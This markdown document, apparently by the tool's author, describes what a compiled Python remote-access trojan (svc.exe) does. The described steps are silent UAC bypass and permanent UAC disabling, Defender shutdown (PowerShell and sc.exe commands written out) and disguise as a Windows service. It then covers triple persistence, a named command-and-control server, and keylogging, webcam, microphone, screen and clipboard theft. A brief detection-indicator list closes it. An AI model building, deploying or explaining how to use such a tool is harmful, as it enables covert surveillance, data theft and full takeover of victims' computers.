# What Actually Happens When You Run svc.exe (Compiled client.py)

## 🚀 COMPLETE EXECUTION FLOW ANALYSIS

This document explains **exactly** what happens when you run the compiled `client.py` executable (e.g., `svc.exe`) on a Windows system.

---

## 📋 PHASE 1: INITIAL STARTUP (First 5 seconds)

### 1.1 Environment Check
```
[STARTUP] Python Agent Starting...
[STARTUP] Initializing components...
```

**What happens:**
- Checks if running on Windows
- Detects if already running as Administrator
- Checks for ELEVATED_MODE flag (prevents recursive execution)

### 1.2 Privilege Check
```
[STARTUP] PRIORITY 0: Checking Administrator Privileges...
```

**Two scenarios:**

#### Scenario A: Already Admin
```
[STARTUP] ✅ Already running as Administrator
```
- Proceeds to system configuration

#### Scenario B: Not Admin (Most Common)
```
[STARTUP] ⚪ Running as Standard User
[STARTUP] ✅ Bootstrap method will use UAC bypass to gain admin (no password needed!)
```
- Will attempt UAC bypass in next phase

---

## 📋 PHASE 2: SYSTEM CONFIGURATION (5-15 seconds)

### 2.1 WSL Routing Disable
```
[STARTUP] Step 0: Disabling WSL routing (AGGRESSIVE)...
```

**What it does:**
- Modifies PATH environment variable to prioritize CMD.exe
- Disables WSL (Windows Subsystem for Linux) routing
- Ensures commands use CMD.exe instead of WSL bash

**Registry changes:**
- `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss` (disabled)

---

### 2.2 UAC BYPASS & DISABLE (CRITICAL PHASE)
```
[STARTUP] Step 1: BOOTSTRAP UAC DISABLE (NO ADMIN REQUIRED!)...
[STARTUP] This uses UAC bypass to gain admin, then disables UAC!
```

**What actually happens:**

#### Method 1: UAC Bypass Attempts (Silent, No Prompts)
The script tries multiple methods in order:
1. **Fodhelper.exe** (Protocol hijack)
2. **ComputerDefaults.exe** (ms-settings protocol)
3. **EventVwr.exe** (mscfile registry hijack)
4. **Sdclt.exe** (Folder shell hijack)
5. **AppInfo Service** (VBS script injection)
6. **ICMLuaUtil COM** (COM elevation)

**How they work:**
- Create registry keys in `HKCU\Software\Classes\...`
- Hijack protocol handlers or file associations
- Execute elevated Windows binaries that auto-elevate
- These binaries then run your payload with admin rights

#### Method 2: If UAC Bypass Succeeds
```
[STARTUP] ✅✅✅ UAC DISABLED SUCCESSFULLY!
[STARTUP] ✅ Admin password popups are NOW DISABLED for ALL exe/installers!
```

**Registry modifications made:**
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
- EnableLUA = 0 (UAC completely disabled)
- ConsentPromptBehaviorAdmin = 0 (No prompts for admins)
- PromptOnSecureDesktop = 0 (No secure desktop)
```

**Effect:** 
- UAC is PERMANENTLY DISABLED system-wide
- ALL programs can run as admin without password
- Requires restart to take full effect

#### Method 3: If UAC Bypass Fails
```
[STARTUP] ⚠️ Bootstrap UAC bypass failed
[STARTUP] ℹ️ Agent will continue running with normal privileges
[STARTUP] ℹ️ UAC bypass will retry in background
```

**What happens:**
- Script continues running as normal user
- Background thread keeps retrying UAC bypass every 30 seconds
- Elevated actions won't work, but basic functionality continues

---

### 2.3 Windows Defender Disable
```
[STARTUP] Step 2: Disabling Windows Defender...
```

**What it tries to do:**
- Disable Real-time Protection
- Disable Cloud-delivered Protection
- Disable Automatic Sample Submission
- Add exclusions for the executable

**Methods used:**
1. **Registry modifications:**
   ```
   HKLM\SOFTWARE\Policies\Microsoft\Windows Defender
   - DisableAntiSpyware = 1
   - DisableRealtimeMonitoring = 1
   ```

2. **PowerShell commands:**
   ```powershell
   Set-MpPreference -DisableRealtimeMonitoring $true
   Set-MpPreference -DisableBehaviorMonitoring $true
   ```

3. **Service manipulation:**
   ```
   sc.exe config WinDefend start=disabled
   sc.exe stop WinDefend
   ```

**Note:** Often fails on modern Windows due to Tamper Protection

---

### 2.4 Notification Disable
```
[STARTUP] Step 3: Disabling Windows notifications...
```

**Registry changes:**
```
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications
- ToastEnabled = 0

HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings
- NOC_GLOBAL_SETTING_ALLOW_NOTIFICATION_SOUND = 0
```

**Effect:** Disables Windows notifications and sounds

---

## 📋 PHASE 3: STEALTH & OBFUSCATION (Ongoing)

### 3.1 Process Hiding
```
[STEALTH] Initializing stealth mode...
```

**What happens:**
- Random delay (anti-sandbox)
- Process name obfuscation
- Disguised service names shown:
  - "System Update Service"
  - "Windows Security Service"
  - "Microsoft Update Service"
  - etc.

### 3.2 Fake Service Messages
```
System Update Service v2.1
Initializing system components...
WebRTC Optimization Features:
  ✓ Bandwidth estimation & adaptive bitrate control
  ✓ Intelligent frame dropping under load
  ...
```

**Purpose:** Makes it look like a legitimate Windows service

---

## 📋 PHASE 4: PERSISTENCE INSTALLATION (Background)

### 4.1 Registry Persistence
**Location:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
**Entry:** `svchost32 = "C:\Users\<user>\AppData\Local\Microsoft\Windows\svchost32.exe"`

### 4.2 Startup Folder
**File:** `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SystemService.bat`
**Content:**
```batch
@echo off
start "" "C:\Path\To\svchost32.exe"
```

### 4.3 Scheduled Task
**Task name:** `SystemService` or `WindowsUpdate`
**Trigger:** System startup + Every hour
**Action:** Run the executable

### 4.4 File Deployment
**Original location:** Where you run it from
**Deployment location:** `C:\Users\<user>\AppData\Local\Microsoft\Windows\svchost32.exe`

**What happens:**
1. Copies itself to stealth location
2. Hides the file (`attrib +h +s`)
3. Runs from new location
4. Original can be deleted

---

## 📋 PHASE 5: NETWORK CONNECTION (Immediate)

### 5.1 Server Connection
```
Connected to server. Registering with agent_id: <hostname>
```

**Server URL:** `https://agent-controller-backend.onrender.com`
**Protocol:** Socket.IO (WebSocket)
**Agent ID:** Computer hostname

### 5.2 Registration
**Data sent to server:**
```json
{
  "agent_id": "DESKTOP-ABC123",
  "hostname": "DESKTOP-ABC123",
  "username": "John",
  "os": "Windows 10",
  "platform": "Windows",
  "ip": "192.168.1.100",
  "is_admin": true/false,
  "capabilities": {
    "screen_capture": true,
    "webcam": true,
    "audio": true,
    "keylogger": true,
    "file_manager": true,
    ...
  }
}
```

---

## 📋 PHASE 6: ACTIVE MONITORING (Continuous)

### 6.1 Background Threads Started

**Thread 1: Telemetry**
- CPU usage (every 1 second)
- Memory usage (every 1 second)
- Sends to server every 5 seconds

**Thread 2: Keylogger** (if enabled)
- Captures all keystrokes
- Logs to local file
- Sends batches to server

**Thread 3: Clipboard Monitor** (if enabled)
- Monitors clipboard changes
- Sends clipboard content to server

**Thread 4: Screen Capture** (when requested)
- Captures screen at 30-60 FPS
- Compresses with JPEG
- Streams to server via WebSocket

**Thread 5: Webcam Stream** (when requested)
- Captures webcam feed
- Encodes video
- Streams to server

**Thread 6: Audio Stream** (when requested)
- Captures microphone
- Streams to server

**Thread 7: Privilege Retry** (if not admin)
- Retries UAC bypass every 30 seconds
- Up to 10 attempts

---

## 📋 PHASE 7: REMOTE CONTROL (Awaiting Commands)

### 7.1 Available Commands

The agent now waits for commands from the server. When received:

**System Commands:**
- `execute_command` - Run any shell command
- `execute_powershell` - Run PowerShell scripts
- `get_system_info` - Send detailed system info
- `shutdown`, `restart`, `sleep` - Power actions

**File Operations:**
- `upload_file` - Upload file to server
- `download_file` - Download file from server
- `list_files` - Browse filesystem
- `delete_file` - Delete files

**Monitoring:**
- `start_screen_stream` - Screen sharing
- `start_keylogger` - Keystroke logging
- `start_camera` - Webcam streaming
- `start_audio` - Microphone streaming

**Advanced:**
- `spawn_shell` - Interactive shell
- `inject_dll` - Process injection
- `take_screenshot` - Single screenshot
- `record_audio` - Audio recording

---

## 📋 WHAT YOU'LL ACTUALLY SEE

### On First Run (Console Output):
```
[STARTUP] Python Agent Starting...
[STARTUP] Initializing components...
================================================================================
[STARTUP] PRIORITY 0: Checking Administrator Privileges...
[STARTUP] NOTE: Admin is NOT required - bootstrap method will handle it!
================================================================================
[STARTUP] ⚪ Running as Standard User
[STARTUP] ✅ Bootstrap method will use UAC bypass to gain admin (no password needed!)
================================================================================

[STARTUP] === SYSTEM CONFIGURATION STARTING ===
[STARTUP] Using SILENT methods (no popups, no user interaction)
================================================================================

[STARTUP] Step 0: Disabling WSL routing (AGGRESSIVE)...
[STARTUP] ✅ WSL routing disabled - commands will use CMD.exe directly

[STARTUP] Step 1: BOOTSTRAP UAC DISABLE (NO ADMIN REQUIRED!)...
[STARTUP] This uses UAC bypass to gain admin, then disables UAC!
[STARTUP] Works from STANDARD USER account - NO PASSWORD NEEDED!
[STARTUP] NOTE: If UAC bypass fails, the agent will continue running normally

[STARTUP] ✅✅✅ UAC DISABLED SUCCESSFULLY!
[STARTUP] ✅ Used UAC bypass - NO ADMIN PASSWORD NEEDED!
[STARTUP] ✅ Admin password popups are NOW DISABLED for ALL exe/installers!

[STARTUP] Step 2: Disabling Windows Defender...
[STARTUP] ✅ Windows Defender disabled successfully

[STARTUP] Step 3: Disabling Windows notifications...
[STARTUP] ✅ Notifications disabled successfully

================================================================================
[STARTUP] === SYSTEM CONFIGURATION COMPLETE ===
================================================================================

[STARTUP] ⚠️ IMPORTANT: RESTART REQUIRED for UAC changes to take full effect!
================================================================================

System Update Service v2.1
Initializing system components...
Connected to server. Registering with agent_id: DESKTOP-ABC123
```

### In Task Manager:
- **Process Name:** `svchost32.exe` or original name
- **Location:** `C:\Users\<user>\AppData\Local\Microsoft\Windows\svchost32.exe`
- **Status:** Running
- **User:** Current user (or SYSTEM if elevated successfully)

### Network Activity:
- **Outbound connection to:** `agent-controller-backend.onrender.com:443`
- **Protocol:** HTTPS/WebSocket
- **Persistent connection:** Stays connected

---

## ⚠️ CRITICAL BEHAVIORS

### Auto-Restart
If killed, it will:
1. Auto-restart from scheduled task (every hour)
2. Auto-restart from startup folder (on boot)
3. Auto-restart from registry Run key (on login)

### Elevation Persistence
If UAC bypass succeeds:
1. Creates elevated scheduled task
2. Runs as SYSTEM on next restart
3. Has full system privileges

### Data Exfiltration
Continuously sends:
- Keystrokes
- Screenshots
- Clipboard content
- System information
- File listings

---

## 🛡️ DETECTION INDICATORS

### File System:
- `%LOCALAPPDATA%\Microsoft\Windows\svchost32.exe`
- `%APPDATA%\...\Startup\SystemService.bat`
- `%TEMP%\sysupdate.vbs` (temporary)

### Registry:
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svchost32`
- `HKCU\Software\Classes\ms-settings\Shell\Open\command` (during UAC bypass)
- `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender` (if elevated)

### Network:
- Persistent connection to `agent-controller-backend.onrender.com`
- High-frequency WebSocket traffic

### Process:
- `svchost32.exe` (not legitimate svchost.exe in System32)
- `wscript.exe` executing VBS from temp (during UAC bypass)
- Multiple Python/eventlet threads

---

## 📊 SUMMARY

**When you run svc.exe, it will:**

1. ✅ Check for admin privileges
2. ✅ Attempt UAC bypass (silent, no prompts)
3. ✅ Disable UAC permanently if successful
4. ✅ Attempt to disable Windows Defender
5. ✅ Disable Windows notifications
6. ✅ Copy itself to hidden location
7. ✅ Install multiple persistence mechanisms
8. ✅ Connect to remote server
9. ✅ Register as controllable agent
10. ✅ Start monitoring threads
11. ✅ Wait for remote commands
12. ✅ Auto-restart if terminated

**Result:** Full remote access to the computer with persistence and stealth.
